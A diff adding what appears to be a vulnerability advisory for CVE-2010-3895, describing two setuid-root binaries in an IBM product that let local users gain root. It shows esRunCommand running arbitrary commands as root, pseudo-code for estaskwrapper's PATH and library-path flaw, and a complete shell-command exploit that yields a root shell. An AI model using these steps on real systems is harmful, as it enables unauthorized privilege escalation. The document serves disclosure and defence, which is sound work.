@@ -1,0 +1,67 @@
+* Privilege escalation in two applications (CVE-2010-3895)
+
+Root SUID bits are set for the applications »esRunCommand« and »estaskwrapper«.
+
+-------------------------------------------------------------------------
+  -rwsr-xr-x 1 root users ... /opt/IBM/es/bin/esRunCommand
+  -rwsr-xr-x 1 root users ... /opt/IBM/es/bin/estaskwrapper
+-------------------------------------------------------------------------
+
+
+»esRunCommand« takes one argument and runs it as root. See example below.
+-------------------------------------------------------------------------
+  -rwsr-xr-x 1 root users ... /opt/IBM/es/bin/esRunCommand
+  
+  joemueller@XXX:/opt/IBM/es/bin> ./esRunCommand id
+  OUTPUT: cmd is id
+  id
+  uid=0(root) gid=100(users) Gruppen=16(dialout),33(video),100(users)
+-------------------------------------------------------------------------
+
+
+
+The application »estaskwrapper« is meant to start the application »estasklight«. 
+The pseudo c code looks like this:
+-------------------------------------------------------------------------
+	main() {
+	  int auth = 0;
+	  ...
+	  if (argv[1] == "estasklight") {
+	    auth = 1;
+		  ...
+		  path = getenv("ES_LIBRARY_PATH");
+		  if (path) {
+		    setenv("LD_LIBRARY_PATH", path);
+		    setenv("LIBPATH", path);
+		    ...
+		    if (auth) {
+		  	  execvp ("estasklight", args);
+		    }
+		    ...
+		  }
+	    ...
+	  }
+	...
+	}
+-------------------------------------------------------------------------
+
+
+Explanation of the code:
+
+»argv[1]« is the first command line argument, that is compared with the string
+»estasklight«. If it is equal the »auth« flag is set. 
+If the user has the environment variable »ES_LIBRARY_PATH« set, the value is
+copied to two new environment variables »LD_LIBRARY_PATH« and »LIBPATH«.
+If the »auth« flag is set, the application »estasklight« is executed.
+
+
+
+Exploit for running /bin/sh
+-------------------------------------------------------------------------
+joemueller@XXX:~> cp /bin/sh ~/bin/estasklight
+joemueller@XXX:~> export ES_LIBRARY_PATH=/home/joemueller
+joemueller@XXX:~> export PATH=/home/joemueller/bin:$PATH
+joemueller@XXX:~> /opt/IBM/es/bin/estaskwrapper estasklight
+XXX:~# id
+uid=0(root) gid=100(users) Gruppen=16(dialout),33(video),100(users)
+-------------------------------------------------------------------------
